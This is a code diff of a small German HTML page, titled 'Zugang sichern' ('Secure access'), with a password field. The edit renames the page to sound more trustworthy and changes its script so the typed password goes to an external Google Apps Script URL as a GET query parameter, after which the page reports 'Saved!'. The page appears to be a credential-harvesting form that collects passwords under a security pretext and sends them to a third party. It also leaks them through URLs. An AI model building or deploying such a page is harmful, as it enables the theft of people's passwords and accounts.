@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Geheimer Zugang</title>
+  <title>Zugang sichern</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -73,22 +73,19 @@
       const pw = document.getElementById("pw").value;
       const msg = document.getElementById("msg");
 
-      fetch("https://script.google.com/macros/s/AKfycbx4VOClu70N3wzvVnPQrHg7bYRkl9VpZUTOwcbdZKvxtDE-poCyN8z_T_xO9_hnyojY/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "password=" + encodeURIComponent(pw)
-      })
-      .then(res => res.text())
-      .then(data => {
-        msg.innerHTML = "✅ Gespeichert! Danke.";
-        document.getElementById("pw").value = "";
-      })
-      .catch(err => {
-        msg.innerHTML = "❌ Fehler beim Senden.";
-        console.error(err);
-      });
+      const url = "https://script.google.com/macros/s/AKfycbx4VOClu70N3wzvVnPQrHg7bYRkl9VpZUTOwcbdZKvxtDE-poCyN8z_T_xO9_hnyojY/exec?password=" + encodeURIComponent(pw);
+
+      fetch(url)
+        .then(res => res.text())
+        .then(data => {
+          msg.innerHTML = "✅ Gespeichert!";
+          document.getElementById("pw").value = "";
+        })
+        .catch(err => {
+          msg.innerHTML = "❌ Fehler beim Senden.";
+          console.error(err);
+        });
     }
   </script>
 </body>
 </html>
-
